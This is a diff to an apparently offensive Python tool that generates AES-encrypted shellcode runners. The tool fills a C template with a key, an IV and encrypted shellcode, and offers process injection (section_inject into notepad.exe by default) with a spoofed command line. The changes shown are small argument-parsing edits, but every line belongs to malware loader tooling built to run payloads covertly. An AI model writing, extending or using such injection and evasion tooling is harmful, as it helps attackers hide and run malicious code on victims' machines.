@@ -17,32 +17,29 @@ TEMPLATE = """
 uint8_t iv[]  = { %s };
 uint8_t key[] = { %s };
 
-unsigned char encrypted_instructions[] = { %s };
+unsigned char encrypted_instructions[ENCRYPTED_BIN_LEN] = { %s };
 """
 
 
 def format_shellcode(shellcode):
     hshellcode = ""
-
     code_size = len(shellcode)
-
     for num, byte in enumerate(shellcode):
         if num != code_size - 1:
             hshellcode += f"{hex(byte)},"
         else:
             hshellcode += f"{hex(byte)}"
-
     return hshellcode
 
 
 # arguments
-
+verbose = False
 parser = argparse.ArgumentParser(description="generate AES encrypted shellcode runners")
 parser.add_argument('-inbin', type=str, help=".bin file")
 parser.add_argument('-execmethod', type=str, choices=['section_inject', 'section_runner', 'section_runner_dll', 'runner', 'runner_dll'], default="runner")
 parser.add_argument('--process', type=str, help="process to inject (only with \'section_inject\')", default="notepad.exe", required=False)
 parser.add_argument('--cmdline', type=str, default="notepad", help="cmdline argument to show", required=False)
-parser.add_argument('--v', type=bool, help="print config", required=False)
+parser.add_argument('--verbose', default=False, action='store_true', dest='verbose')
 args = parser.parse_args()
 input_filename = args.inbin
 exec_method = args.execmethod
@@ -85,7 +82,7 @@ with open("new_config.h", "w") as f:
    f.write(config_h)
 
 # make the binary
-if args.v:
+if args.verbose:
     print("[*] Printing new_config.h\n\n")
     print(config_h)
     print("[+] compiling . . .")
